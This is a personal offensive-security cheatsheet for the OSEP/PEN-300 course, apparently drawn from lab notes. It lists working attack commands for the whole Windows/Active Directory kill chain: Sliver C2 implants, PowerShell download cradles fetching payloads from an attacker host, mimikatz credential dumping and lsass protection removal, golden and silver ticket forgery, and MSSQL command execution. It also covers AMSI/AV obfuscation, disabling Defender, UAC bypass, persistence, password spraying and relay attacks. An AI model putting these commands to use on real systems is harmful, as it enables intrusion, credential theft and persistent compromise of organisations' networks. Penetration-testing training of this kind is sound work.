# OSEP / PEN-300 Commands Cheatsheet

A categorized reference of every command pulled from my PEN-300 notes and challenge writeups. 

---

## Table of Contents
1. [Sliver C2](#sliver-c2)
2. [Active Directory / Kerberos Attacks](#active-directory--kerberos-attacks)
3. [Credential Dumping](#credential-dumping)
4. [MSSQL Abuse](#mssql-abuse)
5. [PowerShell Tricks](#powershell-tricks)
6. [Windows Privilege Escalation](#windows-privilege-escalation)
7. [Persistence](#persistence)
8. [Lateral Movement / Auth](#lateral-movement--auth)
9. [Pivoting (Ligolo-ng & Others)](#pivoting-ligolo-ng--others)
10. [Enumeration Tools (BOF/Armory/Scripts)](#enumeration-tools-bofarmoryscripts)
11. [Web Exploitation](#web-exploitation)
12. [Phishing / Initial Access](#phishing--initial-access)
13. [Linux Privesc & Enumeration](#linux-privesc--enumeration)
14. [Password Cracking](#password-cracking)
15. [Misc Utilities](#misc-utilities)

---

## Sliver C2

### Generating Implants / Listeners
```txt
generate --mtls <attacker-ip>:443 --os windows --save /path/to/output
generate --mtls <attacker-ip>:443 --os linux --save /path/to/output
generate --mtls <attacker-ip>:443 --os windows -f service --save /path/to/output/service.exe
generate --mtls <attacker-ip>:443 --os windows --format shellcode --arch x64 --save mtls_443.bin

# start an mtls listener as a job
mtls -L <attacker-ip> -l 443
mtls --lhost <attacker-ip> --lport 443
```

### Jobs / Sessions / Beacons
```txt
jobs            # list active jobs
jobs -K         # kill all jobs

sessions        # list sessions
sessions -i <sessid>   # interact with a session

exit            # exit interactive shell, then CTRL+D

rename -n <name>   # rename current session
```

### Executing Shellcode / Assemblies
```txt
execute-shellcode -p 0 agent.bin           # run PIC shellcode (e.g. ligolo agent, GodPotato, PrintSpoofer)
execute-shellcode godpotato.bin
execute-assembly -p notepad.exe GodPotato.exe -- -cmd 'c:\windows\tasks\up.exe'
```

### Process / File Operations
```txt
info
getprivs
getuid
ps
ps -f
upload /path/to/local/file.exe 'c:\windows\tasks\file.exe'
download 'c:\path\to\file\<filename>.zip'
migrate -p <pid>          # spawns a new session, keeps old one
procdump -p <pid>          # dump a process's memory (e.g. lsass)
chmod -- /var/tmp/linpeas.sh 777   # linux sliver session

execute -o <cmd>          # run a native command, capture output
execute -o sc qc <service-name>
execute -t 60 -o msiexec /qn /i http://<attacker-ip>/payload.msi
```

### Networking
```txt
socks5 start
# /etc/proxychains4.conf -> socks5 127.0.0.1 1081
proxychains -q impacket-mssqlclient '<DOMAIN>/<user>:<password>@127.0.0.1' -windows-auth

portfwd add -b 127.0.0.1:1433 -r <target-ip>:1433
rportfwd add -b <target-ip>:443 -r <attacker-ip>:80
```

### Armory Extensions
Install: `armory` (list), `armory install <tool>`, `armory install all`

Syntax: `command -- -param1 "1" -param2 "2"`

**Core tools used**
```txt
# credential access
mimikatz -- '"privilege::debug" "sekurlsa::logonpasswords"'
mimikatz -- '"privilege::debug" "lsadump::cache"'
mimikatz -- '"privilege::debug" "lsadump::sam"'
mimikatz -- '"privilege::debug" "lsadump::dcsync /user:<target-user>"'
mimikatz -- '"privilege::debug" "lsadump::lsa /inject /name:krbtgt"'   # alt way to get a user's/krbtgt hash
mimikatz -- '"privilege::debug" "lsadump::secrets"'
mimikatz -- '"privilege::debug" "sekurlsa::dpapi"'
mimikatz -- '"!processprotect /process:lsass.exe /remove"'            # disable PPL (after loading mimidrv)
mimikatz -- '"kerberos::golden /user:<user> /domain:<domain> /sid:S-1-... /sids:S-1-...-519 /aes256:<hash> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:out.kirbi"'

nanodump -- -pid <lsass-pid> --dump-name 'dump' --write-file 1 --signature 'PMDM'   # needs PPL disabled

sharpsecdump -M -E -- -target=<target-ip>     # dump SAM/SECURITY/LSA secrets remotely

rubeus -M -E -- asktgt /user:<user> /rc4:<hash> /domain:<domain> /dc:<dc-host>.<domain> /ptt /nowrap
rubeus -M -E -- kerberoast /nowrap
rubeus -- kerberoast /domain:<domain> /nowrap
rubeus -- silver /service:http/<target-host>.<domain> /rc4:<hash> /sid:<sid> /user:<user> /domain:<domain> /nowrap /ptt
rubeus -M -E -- hash /password:<password>          # get NTLM hash from a known password

seatbelt -M -E -- -group=all
seatbelt -i -E -M -t 240 -- -group=all -outputfile=c:\\windows\\tasks\\belt.json

sharp-hound-4 -M -E -t 300 -- -c all -d <domain> --zipfilename out.zip --outputdirectory c:\\users\\public

sharpup -M -E -t 120 -- audit

scshell -- -targetHost <target-ip> -serviceName <service-name> -payload 'C:\windows\system32\cmd.exe /C powershell -c ping <attacker-ip>'

sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/HostRecon.ps1 -c "Invoke-HostRecon"'
sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/PowerUp.ps1 -c "Invoke-AllChecks"'
sharpsh -t 400 -- '-u http://<attacker-ip>/winPEAS.ps1 -c 1'    # drop into a shell and run - better output
sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/Get-ServiceAcl.ps1 -c "Get-ServiceAcl -Name <svc> | select -expand Access"'
sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/PowerView.ps1 -c "Get-DomainComputer -TrustedToAuth"'
sharpsh -t 20 -E -M -i -- -u http://<attacker-ip>/PowerView.ps1 -e -c <base64ps command>   # encoded command via sharpsh

sharpview -E -M -- Get-DomainUser -TrustedToAuth

sharplaps -M -E -- /host:<dc-ip>          # dump LAPS passwords (requires membership in LAPS readers group)

sharpdpapi -- 'ps /target:c:\path\to\service.xml {masterkey-guid}:<masterkey-sha1>'

cacls -- -filepath 'C:\Program Files'
sa-netloggedon
sa-whoami
sa-cacls -- -filepath 'c:\program files\'
remote-sc-start -- -service-name <service-name>
bloodyad ...   # see AD section
```

**Other armory tools worth knowing**
`c2tc-lapsdump`, `c2tc-petitpotam`, `chisel`, `delegationbof`, `inject-amsi-bypass`, `inject-etw-bypass`, `inject-ntqueueapcthread`, `inline-execute-assembly`, `remote-adduser`, `remote-addusertogroup`, `sharpersist`, `sharpchrome` (dump browser passwords/cookies)

### Windows Native Commands (via `execute -o` / cmd.exe)
```cmd
:: list services with unquoted service paths
cmd.exe /c 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"'

:: transfer files with certutil
certutil.exe -urlcache -f <url> <output>

:: disable Defender (rollback signatures)
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
```

---

## Active Directory / Kerberos Attacks

### Kerberoasting / AS-REP Roasting
```txt
rubeus -E -M -- kerberoast /nowrap
rubeus -- kerberoast /domain:<domain> /nowrap
hashcat tgs_hashes.txt --force --hash-type=13100 rockyou.txt --hwmon-disable

# no pre-auth
Get-DomainUser -PreauthNotRequired -Verbose

# nxc based
nxc ldap <dc-ip> -k --use-kcache -u <user> --dns-server <dc-ip> --kerberoasting kerberoast.txt
nxc ldap <dc-ip> -k --use-kcache -u <user> --dns-server <dc-ip> --asreproast asreproast.txt
nxc ldap <dc-ip> -k --use-kcache -u <user> --dns-server <dc-ip> --bloodhound -c all

# targeted kerberoasting (abusing GenericWrite over a user, sets an SPN then requests TGS)
python3 targetedKerberoast.py -v -d '<domain>' -u <user> -p '<password>' -f hashcat --request-user <target-user> -o tgs_out.txt
```

### Constrained Delegation (S4U2Self/S4U2Proxy)
```txt
# find delegatable SPN
sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/PowerView.ps1 -c "Get-DomainComputer -TrustedToAuth"'
# or
Get-DomainComputer -TrustedToAuth

# Route 1 - Rubeus (from a Windows shell you control)
rubeus -E -M -- asktgt /user:<user> /domain:<domain> /rc4:<hash> /nowrap
rubeus -E -M -i -- s4u /ticket:<base64-tgt> /impersonateuser:administrator /msdsspn:cifs/<target-host> /nowrap /ptt

# Route 2 - impacket (single command, from Linux)
getST.py -spn 'cifs/<target-host>' -impersonate administrator <domain>/<user>:'<password>' -dc-ip <dc-ip>
export KRB5CCNAME='administrator@cifs_<target-host>@<DOMAIN>.ccache'
psexec.py <domain>/administrator@<target-host> -k -no-pass -dc-ip <dc-ip> -target-ip <target-ip>

# using a machine account hash with an altservice (when target service isn't the delegated one)
getST.py -spn 'MSSQLSvc/<sql-host>.<domain>' -impersonate 'administrator' -hashes <lm:nt> '<DOMAIN>/<COMPUTER>$'
getST.py -spn 'MSSQLSvc/<sql-host>.<domain>' -impersonate 'administrator' -hashes <lm:nt> -altservice 'cifs' '<DOMAIN>/<COMPUTER>$'
```

### Resource-Based Constrained Delegation (RBCD)
```txt
# requires GenericAll/GenericWrite/WriteAccountRestrictions on target computer object
rbcd.py -delegate-from '<SOURCE-COMPUTER>$' -delegate-to '<TARGET-COMPUTER>$' -action 'write' -hashes <lm:nt> <domain>/<source-computer>$

getST.py -spn 'cifs/<target-host>.<domain>' -impersonate 'administrator' -hashes <lm:nt> <domain>/<source-computer>$
export KRB5CCNAME=<ticket.ccache>
psexec.py <domain>/<user>@<target-host>.<domain> -k -no-pass
```

### Unconstrained Delegation
```txt
# monitor for TGTs arriving from a machine w/ unconstrained delegation
rubeus -M -E -- monitor /interval:5 /nowrap /filteruser:<computer>$

# force the target machine account to auth to you (spoolsample / printer bug)
&"c:\program files\setup\spoolsample.exe <dc-host> <target-host>"
```

### Using / Converting Kerberos Tickets
```sh
# kirbi (Windows) -> ccache (Linux)
cat ticket.kirbi | base64 -d > ticket_out.kirbi
ticketConverter.py ticket_out.kirbi ticket_out.ccache
export KRB5CCNAME=/path/to/ticket_out.ccache
klist

# generate a krb5.conf for a domain (needed for evil-winrm-py / kerberos auth tools)
nxc smb <domain> --generate-krb5-file krb5.conf
export KRB5_CONFIG=krb5.conf

# verify kerberos creds work
nxc ldap <target-ip> -k --use-kcache -u <user>
```

### DCSync / Golden & Silver Tickets / SID History
```txt
# dcsync a specific user (needs DA / DS-Replication rights)
mimikatz -- '"privilege::debug" "lsadump::dcsync /user:<target-user>"'
mimikatz -- '"privilege::debug" "lsadump::dcsync /user:<domain>\krbtgt"'

# alternate way to get krbtgt (or any) hash when dcsync fails
mimikatz -- '"privilege::debug" "lsadump::lsa /inject /name:krbtgt"'

# get group SIDs needed for sid history / golden ticket
Get-DomainGroup -Identity "Domain Admins" -Domain <child-domain>       # rid 512
Get-DomainGroup -Identity "Enterprise Admins" -Domain <parent-domain>  # rid 519

# GOLDEN TICKET (with SID history for cross-domain / parent-child abuse)
mimikatz -- '"kerberos::golden /user:administrator /domain:<child-domain> /sid:<child-domain-sid> /sids:<parent-domain-sid>-519 /aes256:<krbtgt-aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:da.kirbi"'

# SILVER TICKET (forged TGS for a specific service, needs the service account's hash)
rubeus -- silver /service:http/<target-host>.<domain> /rc4:<hash> /sid:<domain-sid> /user:<user> /domain:<domain> /nowrap /ptt

# SID HISTORY via impacket ticketer (request a real TGT + inject extra SID of parent domain group)
ticketer.py -nthash <krbtgt-nt> -aesKey <krbtgt-aes256> -domain-sid <child-domain-sid> -domain <child-domain> \
  -extra-sid <parent-domain-sid>-519 -request -user <user> -hashes <lm:nt> administrator
```

### ACL / Group / Password Abuse (bloodyAD, dacledit, PowerView)
```txt
# check group membership
bloodyad -u <user> -p <lm:nt> -H <dc-host>.<domain> -i <dc-ip> get membership <user>

# WriteDacl abuse: grant AddMembers on a group, then add yourself (DA nesting abuse)
dacledit.py -action 'write' -rights 'WriteMembers' -principal '<user>' -target-dn 'CN=<GROUP>,OU=<OU>,DC=<DOMAIN-PART1>,DC=<DOMAIN-PART2>' -hashes <lm:nt> -dc-ip <dc-ip> <DOMAIN>/<user>
bloodyad -u <user> -p <lm:nt> -H <dc-host>.<domain> -i <dc-ip> add genericAll <group> <user>
bloodyad -u <user> -p <lm:nt> -H <dc-host>.<domain> -i <dc-ip> add groupMember <group> <user>

# ForceChangePassword / GenericAll -> reset a user's password
bloodyad -u <user> -p '<password>' -H <domain> -i <dc-ip> set password <target-user> '<new-password>'
bloodyad -d <domain> -u <user> -p <lm:nt> -H <dc-ip> set password <target-user> '<new-password>'
changepasswd.py -k -altuser <user> -newpass <new-password> -dc-ip <dc-ip> -no-pass -reset <domain>/<target-user>@<dc-host>.<domain>
changepasswd.py -altuser <user> -althash <lm:nt> -newpass <new-password> -reset <domain>/<target-user>@<dc-host>.<domain>

# GenericWrite over a user -> scriptPath abuse (waits for user logon, executes your binary via SMB)
bloodyad -d <domain> -u <user> -p '<password>' -i <dc-ip> set object <target-user> scriptpath -v '\\<attacker-ip>\share\payload.exe'
bloodyad -d <domain> -u <user> -p '<password>' -i <dc-ip> get object <target-user>   # verify

# GenericWrite over a user -> Set-DomainUserPassword via PowerView (from an existing implanted process)
base64ps 'Set-DomainUserPassword -Identity <target-user> -AccountPassword $(ConvertTo-SecureString "<new-password>" -AsPlainText -Force)'
sharpsh -t 20 -E -M -i -- -u http://<attacker-ip>:8083/win/scripts/PowerView.ps1 -e -c <base64-of-command>
sharpsh -t 20 -- '-u http://<attacker-ip>:8083/win/scripts/PowerView.ps1 -c "Get-DomainUser -Identity <target-user> | select pwdlastset"'

# add a user to Enterprise Admins directly (once DA)
net group "Enterprise Admins" "<user>" /add /domain
```

### DPAPI
```txt
mimikatz -- '"privilege::debug" "sekurlsa::dpapi"'
sharpdpapi -- 'ps /target:c:\users\<user>\scripts\service.xml {masterkey-guid}:<masterkey-sha1>'
mimikatz -- '"privilege::debug" "dpapi::ps /in:c:\users\<user>\scripts\service.xml /masterkey:<masterkey> /unprotect"'
```

---

## Credential Dumping

```txt
# mimikatz basics (needs privilege::debug first)
mimikatz -- privilege::debug
mimikatz -- '"privilege::debug" "sekurlsa::logonpasswords"'

# disable PPL to allow lsass access (load mimidrv as a kernel service)
sc create mimidrv binPath= C:\windows\tasks\mimidrv.sys type= kernel start= demand
sc start mimidrv
mimikatz -- '"!processprotect /process:lsass.exe /remove"'

# nanodump (needs pid of lsass, works better with PPL disabled)
nanodump -- -pid <lsass-pid> --dump-name 'dump' --write-file 1 --signature 'PMDM'
pypykatz lsa minidump dump     # parse the dump locally

# remote SAM/SECURITY/LSA secrets
sharpsecdump -M -E -- -target=<target-ip>

# SAM/SYSTEM via shadow copy (when reg save fails, e.g. locked by nt authority/system w/o enough rights)
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows      # verify
:: run these in cmd, not powershell - they fail silently in ps
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\windows\tasks\system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam c:\windows\tasks\sam

secretsdump.py -sam sam.hive -system system.hive LOCAL   # crack locally after download

# reg save (works when running as a fully-privileged nt authority\system, not a service acct)
reg save HKLM\sam c:\windows\tasks\sam
```
> If `reg save`/mimikatz fail from your current shell, `migrate -p <pid>` to a process fully owned by `nt authority\system` (not a low-priv service context) and retry.

---

## MSSQL Abuse

### SQLRecon
```txt
sqlrecon -- /auth:wintoken /h:<sql-host> /m:users
sqlrecon -- /auth:wintoken /h:<sql-host> /m:info
sqlrecon -- /auth:wintoken /h:<sql-host> /m:whoami
sqlrecon -- /auth:wintoken /h:<sql-host> /m:databases
sqlrecon -- /auth:wintoken /h:<sql-host> /m:tables /db:<db>
sqlrecon -- /auth:wintoken /h:<sql-host> /m:enablexp
sqlrecon -- /auth:wintoken /h:<sql-host> /m:checkrpc
sqlrecon -- /auth:wintoken /h:<sql-host> /m:xpcmd /c:"whoami"
sqlrecon -- /enum:sqlspns

# local auth
SQLRecon.exe /a:local /u:sa /p:<password> /h:<sql-host> /m:xpcmd /c:"dir c:\\"

# arbitrary query
sqlrecon -- /module:query /h:<sql-host> /c:"use msdb; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
sqlrecon -- /m:query /h:<sql-host> /c:"EXEC master..xp_dirtree '\\\\<attacker-ip>\\share';"
```
Interesting modules: `impersonate`, `checkrpc`, `enablerpc`, `disablerpc`, `enablexp`, `disablexp`, `enableole`, `disableole`, `enableclr`, `disableclr`

### Direct T-SQL (via mssqlclient.py / sqli / xp_cmdshell)
```sql
-- enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- run a rev shell / download cradle via xp_cmdshell
EXEC xp_cmdshell 'powershell -enc <base64>';

-- change / view current user, roles, perms
select user_name();
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions('sa', 'LOGIN');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');   -- look for IMPERSONATE ANY LOGIN / CONTROL SERVER / AUTHENTICATE SERVER

-- change a user's password (sqli / dbo context)
ALTER LOGIN <target-login> WITH PASSWORD = '<new-password>';

-- linked servers
EXEC sp_linkedservers;
EXEC sp_helplinkedsrvlogin 'LINKED_SERVER_NAME';
EXEC sp_serveroption 'LINKED_SERVER_NAME', 'rpc', 'true';
EXEC sp_serveroption 'LINKED_SERVER_NAME', 'rpc out', 'true';

-- query a linked server
select * from openquery("LINKED_SERVER_NAME", 'select SYSTEM_USER');
select * from openquery("LINKED_SERVER_1", 'select * from openquery("LINKED_SERVER_2", ''select SYSTEM_USER'');');   -- nested
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT LINKED_SERVER_NAME;
EXEC ('xp_cmdshell ''whoami''') AT LINKED_SERVER_NAME;

-- Ole Automation RCE (alt to xp_cmdshell)
DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "ping <attacker-ip>"';
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

### mssqlclient.py (impacket)
```sh
mssqlclient.py <user>:<password>@<target-ip>
mssqlclient.py -hashes <lm:nt> -windows-auth <username>@<target-ip>
mssqlclient.py -no-pass -k <domain>/administrator@<sql-host>.<domain>
```
Native mssqlclient commands: `enum_links`, `use_link "<LINKED_SERVER>";`, `enum_impersonate`, `enable_xp_cmdshell;`

### mssqlclient.py via Sliver .NET assembly (no creds needed / integrated auth)
```ps1
$d = (New-Object System.Net.WebClient).DownloadData('http://<attacker-ip>/sql.exe')
$ass = [System.Reflection.Assembly]::Load($d)
[sql.Program]::Main("")
[sql.Program]::Execute([string[]]@())   # integrated auth variant
```

# via donut -> execute-shellcode in Sliver
donut -c sql.Program -f 1 -o sql.bin -a 2 -i sql.exe
execute-shellcode -p 0 sql.bin


### SQLMap
```sh
sqlmap --dbms mssql -p src --current-user -v 3 -u 'http://<target-ip>/?src=a'
sqlmap --dbms mssql -p src --dbs -v 3 -u 'http://<target-ip>/?src=a'
sqlmap --dbms mssql -p dst -v 2 -u 'http://<target-ip>/?src=a&dst=b' --batch --current-db
sqlmap --dbms mssql -p dst -v 2 -u 'http://<target-ip>/?src=a&dst=b' --batch -D <db> --tables
sqlmap --dbms mssql -p dst -v 2 -u 'http://<target-ip>/?src=a&dst=b' --batch -D <db> -T <table> --dump
```

---

## PowerShell Tricks

### Download Cradles
```ps1
iex (iwr 'http://<attacker-ip>/evil.ps1')
iwr -uri 'http://<attacker-ip>/evil.ps1' -outfile 'c:\windows\temp\evil.ps1'
IEX (New-Object Net.Webclient).downloadstring("http://<attacker-ip>/evil.ps1")
irm http://<attacker-ip>/evil.ps1 | iex

# source from a variable, never touches disk
$src = ((new-object net.webclient).downloadstring("http://<attacker-ip>/LAPSToolkit.ps1")); . ([ScriptBlock]::Create($src)); Get-LAPSComputers
```

### Cradle Flags Cheat-Sheet
| Flag | Alt | Purpose |
|---|---|---|
| `-ExecutionPolicy Bypass` | `-ep bypass` | bypass script execution policy |
| `Invoke-Expression` | `iex` | execute a string as PS in memory |
| `-NoProfile` | `-nop` | skip user profile scripts |
| `-NonInteractive` | `-noni` | suppress prompts |
| `-EncodedCommand` | `-enc`/`-e` | run base64 command |
| `-WindowStyle Hidden` | `-w hidden` | no visible window |
| `-File` | | run script from file |
| `-Command` | `-c` | run inline command |

Sample cradle combos:
```sh
powershell -nop -w hidden -c "iwr http://<attacker-ip>/payload.exe -OutFile $env:TEMP\payload.exe; Start-Process $env:TEMP\payload.exe"
powershell -nop -w hidden -noni -ep bypass -c "iex (iwr http://<attacker-ip>/script.ps1 -UseBasicParsing)"
```

### Base64 Encoding a Payload
```ps1
# PowerShell
$str = 'IEX ((new-object net.webclient).downloadstring("http://<attacker-ip>/a"))'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($str))
```
```sh
# bash
str='IEX ((new-object net.webclient).downloadstring("http://<attacker-ip>/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```
```sh
# python
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://<attacker-ip>/run.txt\\') | IEX'.encode('utf-16le')).decode())"
```

### Running As Another User
```ps1
# local machine
$user = 'domain\username'
$password = 'password' | ConvertTo-SecureString -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($user, $password)
Start-Process -FilePath "powershell.exe" -Credential $credential -ArgumentList '-NoProfile -Command "whoami"'
```
```cmd
runas /user:domain\username powershell.exe
```
```ps1
# remote (requires PSRemoting / Enable-PSRemoting)
Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {whoami}
Enter-PSSession -Computer <target-host>
```

### Misc PowerShell
```ps1
# recursive file search
Get-ChildItem -Path 'C:\Windows' -Filter '*.Management.Automation.dll' -Recurse -Force -ErrorAction SilentlyContinue

# read an ADS stream (e.g. Zone.Identifier / mark-of-the-web)
Get-Content -Path .\file.exe -Stream Zone.Identifier

# PSReadline history file location
(Get-PSReadlineOption).HistorySavePath

# here-doc / Add-Type
$var = @"
using System;
"@
Add-Type $var

# reflection-based .NET assembly loading (evades AV writing exe to disk)
$d = (New-Object Net.WebClient).DownloadData('http://<attacker-ip>/sql.exe')
$ass = [System.Reflection.Assembly]::Load($d)
[sql.Program]::Main("")

# get non-static / static members of a .NET class
[class] | get-member
[class] | get-member -static
[system.appdomain] | get-member -membertype methods
[DateTime]::IsLeapYear(2022)

# select the first item then act on it (two equivalent forms)
[appdomain]::currentdomain.GetAssemblies() | Select -First 1 | ForEach-Object {$_.GetType()}
([appdomain]::currentdomain.GetAssemblies() | Select -First 1).GetType()

# creating an array and conditionally appending to it
$array=@()
$obj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$array+=$_}}

# different loop constructs (tradeoffs)
foreach-object {$_}                          # streams one item at a time - lower memory, harder to debug (alt: % {$_})
foreach($Item in $Array) {$item}              # loads whole collection into memory - faster, easier to debug
for($i=0; $i -le $Array.Length; $i++)         # classic index-based loop

# string obfuscation to dodge signature-based AMSI/AV detection
('{4}{1}{0}e{2}2{3}ll' -f 'n','er','l3','.d','k')
('Cr'+'eat'+'eThre'+'ad')
$string = "tcetorPlautriV";(-join $string[-1..-$string.Length])
$a = '[System.Runtime.InteropServ'; $b = 'ices.Marshal]'; $c = '::Co'; $d = 'py($src, 0, $dst, $src.Length)'; Invoke-Expression ($a+$b+$c+$d)
```

---

## Windows Privilege Escalation

### SeImpersonatePrivilege (Potato Family)
```txt
# PrintSpoofer (server 2016/2019 only)
donut -f 1 -i PrintSpoofer64.exe -a 2 -o print.bin -p '-c c:\windows\tasks\up.exe'
execute-shellcode -p 0 print.bin

# GodPotato (broader OS support)
donut -i GodPotato.exe -a 2 -b 2 -p '-cmd c:\windows\tasks\up.exe' -o godpotato.bin
execute-shellcode godpotato.bin
# if shellcode injection fails, try execute-assembly instead
execute-assembly -p notepad.exe GodPotato.exe -- -cmd 'c:\windows\tasks\up.exe'
```

### Service Hijack (writable service ACL)
```txt
execute -o sc qc <service-name>     # inspect current config
sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/Get-ServiceAcl.ps1 -c "Get-ServiceAcl -Name <service-name> | select -expand Access"'

execute -o sc config <service-name> binPath= "net localgroup Administrators <domain>\\<user> /add" obj= "NT AUTHORITY\\SYSTEM"
execute -o sc config <service-name> start= auto
execute -o sc qc <service-name>     # confirm
execute -o net localgroup administrators   # confirm your user was added
```


### fodhelper UAC Bypass
```ps1
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -enc <base64>" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

### AlwaysInstallElevated (MSI)
```sh
# clone https://github.com/KINGSABRI/MSI-AlwaysInstallElevated and edit the .wxs template with your payload path
wixl -v alwaysInstallElevated-3.wxs -o /path/to/output/payload.msi
```
```txt
execute -t 60 -o msiexec /qn /i http://<attacker-ip>/payload.msi
```

### CLM (Constrained Language Mode) Breakout via InstallUtil
```ps1
iwr -uri http://<attacker-ip>/file.exe -outfile c:\windows\tasks\file.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\windows\tasks\file.exe
```

---

## Persistence

### Scheduled Tasks
```cmd
schtasks /create /tn "taskname" /tr "c:\windows\tasks\update.exe" /sc onstart /ru SYSTEM
schtasks.exe /create /tn "taskname" /tr "c:\windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile=c:\windows\tasks\log.txt /logtoconsole=false /U c:\windows\tasks\p.exe" /sc MINUTE /mo 1 /ru "NT AUTHORITY\SYSTEM"
```
Native utility, can run at boot/SYSTEM privilege regardless of any user login.

### Registry Run Keys
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "name" /t REG_SZ /d "c:\windows\tasks\update.exe" /f
```
Only fires when that specific user logs in (not at boot with nobody logged in).

### Windows Services
```cmd
sc.exe create servicename binPath= "C:\windows\tasks\update.exe" start= auto
```

---

## Lateral Movement / Auth

```sh
# impacket psexec (SYSTEM shell)
psexec.py <domain>/<user>@<dc-host>.<domain> -k -no-pass
psexec.py -hashes <lm:nt> administrator@<target-host>.<domain>
psexec.py <domain>/administrator@<target-host> -k -no-pass -dc-ip <dc-ip> -target-ip <target-ip>

# impacket wmiexec (semi-interactive, quieter than psexec)
wmiexec.py -dc-ip <dc-ip> -hashes <lm:nt> <DOMAIN>/<user>@<target-ip>

# evil-winrm
evil-winrm -i <target-ip> -u <user> -H <hash>
ewp -i <target-ip> -u <user> -k --no-pass   # evil-winrm-py w/ kerberos

# xfreerdp3
xfreerdp3 /v:<target-ip> /u:<user> /p:'<password>' /d:<domain> -dynamic-resolution +clipboard
xfreerdp3 /u:administrator /d:<domain> /p:<password> /v:<target-ip> /cert:ignore

# ssh
ssh -i ./id_rsa <domain>\\<user>@<target-host>.<domain>   # domain in username when pubkey embeds it
ssh -i /path/to/key <user>@<target-ip>
ssh -L 1337:<internal-ip>:8081 -i /path/to/key <user>@<target-ip>   # local port forward
ssh <domain>\\<user>@<target-ip>

# using an ssh private key for git auth (e.g. abusing a compromised dev's key against an internal git server)
export GIT_SSH_COMMAND="ssh -i /path/to/key"
git clone git@<git-host>:<user>/<repo>.git

# netexec / nxc sweeps
nxc smb targets.txt -u users.txt -p passwords.txt -d <DOMAIN> -x whoami
nxc smb <ip-range> -u users.txt -H hashes.txt --continue-on-success   # keep trying creds even after a hit
nxc rdp <ip-range> -u <user> -p <password>
nxc winrm <ip-range> -u 'Administrator' -H <hash> -d <domain> -x hostname
nxc mssql <ip-range> -u <user> -H <lm:nt> --continue-on-success
nxc smb <ip-range> -u <user> -H <lm:nt> --continue-on-success
```
> `--continue-on-success` matters when spraying multiple username/hash pairs — without it, nxc stops trying other creds against a host once one succeeds, which can hide access for a *different* valid account on the same box.

---

## Pivoting (Ligolo-ng & Others)

### Ligolo-ng
```sh
# server side (attacker)
sudo ./proxy -selfcert
# once agent connects: run `session` to select it, then (requires sudo) `autoroute`

# create agent shellcode with donut for injection via Sliver
donut -f 1 -o ./agent.bin -a 2 -p "-connect <attacker-ip>:11601 -ignore-cert" -i /path/to/ligolo-ng/agent.exe
# run inside sliver
execute-shellcode -p 0 agent.bin

# native agent binary (linux target, no injection needed)
./agent -connect <attacker-ip>:11601 -ignore-cert
```

### Sliver Native Pivoting
```txt
portfwd add -b 127.0.0.1:1433 -r <sql-host>:1433
rportfwd add -b <pivot-ip>:443 -r <attacker-ip>:80
```

### Discovering Hosts on a New Segment (no nmap available)
```ps1
$ComputerName = 1..255 | ForEach-Object { "<subnet>.$_" }
$Addresses = $ComputerName -join "' or Address='"
$Filter = "(Address='$Addresses') and ResolveAddressNames='True' and timeout=1000 and ResolveAddressNames=True and StatusCode=0"
Get-WmiObject -Class Win32_PingStatus -Filter $Filter | Sort-Object ProtocolAddressResolved | Select-Object -Property Address,ProtocolAddressResolved
```

### Proxychains (slower fallback when Ligolo agent is unstable)
```sh
sudo proxychains4 nmap -Pn -sT -sVC --top-ports 50 <target-ip> -oN nmap_top50ver_<target-ip>
sudo proxychains4 ssh -i /path/to/key <domain>\\<user>@<target-ip>
```

### ntlmrelayx
```sh
ntlmrelayx.py --no-http-server -smb2support -tf targets.txt -c 'powershell -enc <base64>'
```
Trigger callbacks from a target with `xp_dirtree`/`xp_subdirs` pointed at your relay listener, or SCF/PetitPotam-style coercions.

---

## Enumeration Tools (BOF/Armory/Scripts)

| Tool | Purpose |
|---|---|
| Seatbelt | host/AD misconfig enumeration |
| SharpHound | AD/BloodHound collector |
| PowerUp / Invoke-AllChecks | local Windows privesc checks |
| PrivescCheck | local Windows privesc checks |
| winPEAS | local Windows privesc checks |
| PowerView / SharpView | AD object/ACL enumeration |
| SharpUp | audit-mode privesc checks |
